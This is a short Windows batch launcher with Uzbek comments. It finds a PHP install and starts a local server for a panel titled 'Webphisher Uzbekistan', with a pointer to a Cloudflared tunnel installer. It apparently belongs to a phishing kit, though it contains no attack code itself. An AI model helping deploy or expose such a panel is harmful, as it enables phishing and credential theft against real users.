@echo off
cd /d "%~dp0.."

REM PHP yo'lini avtomatik topish
set "PHP_EXE="
if exist "C:\tools\php85\php.exe" set "PHP_EXE=C:\tools\php85\php.exe"
if exist "C:\php\php.exe" set "PHP_EXE=C:\php\php.exe"
if exist "C:\xampp\php\php.exe" set "PHP_EXE=C:\xampp\php\php.exe"
if "%PHP_EXE%"=="" (
    where php >nul 2>&1 && set "PHP_EXE=php"
)
if "%PHP_EXE%"=="" (
    echo PHP topilmadi. C:\tools\php85\php.exe yoki PATH ga PHP qo'shing.
    pause
    exit /b 1
)

if not "%PHP_EXE%"=="php" (
    for %%I in ("%PHP_EXE%") do set "PHPRC=%%~dpI"
    set "PATH=%PHPRC%;%PHPRC%ext;%PATH%"
)

echo ============================================
echo   Webphisher Uzbekistan
echo   http://127.0.0.1:9090
echo   PHP: %PHP_EXE%
echo ============================================
echo Cloudflared PHP orqali yuklanmasa:
echo   panel\install-cloudflared.bat
echo ============================================

"%PHP_EXE%" -S 127.0.0.1:9090 -t panel panel/router.php
pause
